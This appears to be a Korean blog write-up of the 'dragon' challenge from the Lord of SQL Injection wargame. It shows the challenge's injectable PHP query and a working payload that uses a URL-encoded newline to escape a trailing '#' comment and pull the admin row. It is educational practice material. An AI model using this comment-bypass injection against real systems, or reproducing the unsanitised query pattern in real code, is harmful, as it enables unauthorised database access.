---
title: Lord of SQL Injection Write Up No.20 Dragon
date: 2019-09-15 20:45:46
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 20번 dragon 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

주석 처리를 우회할 수 있는지 확인한다.

### 소스 코드 분석

dragon 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```

- GET 방식으로 `pw`를 받고, `pw`에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("dragon");
```

- 받은 `pw`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 다만 `id='guest'` 뒤에 주석인 `#`이 붙어있어 그 뒤에 들어가는 코드가 처리되지 않는다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 `"admin"`이라는 값이 들어있음'이다.

## Solution

1. 개행 문자로 주석 처리 우회

   `id='guest'` 뒤에 주석인 `#`이 붙어있어 그 뒤에 들어가는 코드가 처리되지 않는다.

   `pw`의 값에 개행 문자인 LF(Line Feed, `%0A`)를 삽입하여 주석 처리를 우회한다.

   ```url
   http://los.eagle-jump.org/dragon_7ead3fe768221c5d34bc42d518130972.php?pw='%0aor 1=1 limit 1,1-- -
   ```

   ```sql
   select id from prob_dragon where id='guest'# and pw='' or 1=1 limit 1,1-- -'
   ```
